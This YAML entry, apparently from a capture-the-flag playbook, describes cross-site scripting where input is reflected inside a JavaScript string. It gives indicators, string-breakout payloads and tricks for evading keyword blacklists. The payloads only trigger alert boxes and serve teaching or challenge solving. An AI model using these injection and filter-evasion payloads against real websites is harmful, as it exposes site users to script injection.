name: xss_javascript_string_context
category: web
tags: [xss, javascript, string_injection, flask]
indicators:
  - "User input placed inside JavaScript string"
  - "Pattern: var name = \"%s\" or similar"
  - "Blacklist-based filtering (incomplete)"
  - "X-XSS-Protection header disabled"

tricks:
  - name: "Step 1: Identify JS string context"
    when: "User input is reflected inside JavaScript string"
    how: "Look for patterns like var x = \"USER_INPUT\""
    payload: |
      # Vulnerable code pattern:
      # var name = "%s"; document.write('Hello ' + name);
      
      # Input is placed directly into JS string context

  - name: "Step 2: Break out of string context"
    when: "Input is inside double-quoted JS string"
    how: "Close the string with \", inject code, comment rest"
    payload: |
      # Basic payload:
      ";alert('XSS');//
      
      # Result: var name = "";alert('XSS');//";
      # The // comments out the trailing ";

  - name: "Step 3: Alternative payloads"
    when: "Basic payload doesn't work"
    how: "Try different string escape techniques"
    payload: |
      # Using single quotes inside:
      ";alert('XSS');//
      
      # Using template literals:
      ";alert(`XSS`);//
      
      # Using String.fromCharCode:
      ";alert(String.fromCharCode(88,83,83));//
      
      # Using eval:
      ";eval('alert(\"XSS\")');//

  - name: "Bypass common blacklists"
    when: "Certain keywords are blocked"
    how: "Use alternative syntax or encoding"
    payload: |
      # If 'alert' is blocked:
      ";confirm('XSS');//
      ";prompt('XSS');//
      ";window['al'+'ert']('XSS');//
      
      # If 'import' is blocked (like this challenge):
      # Just avoid using import, use alert directly
      
      # Case variation (if not case-sensitive check):
      ";ALERT('XSS');//

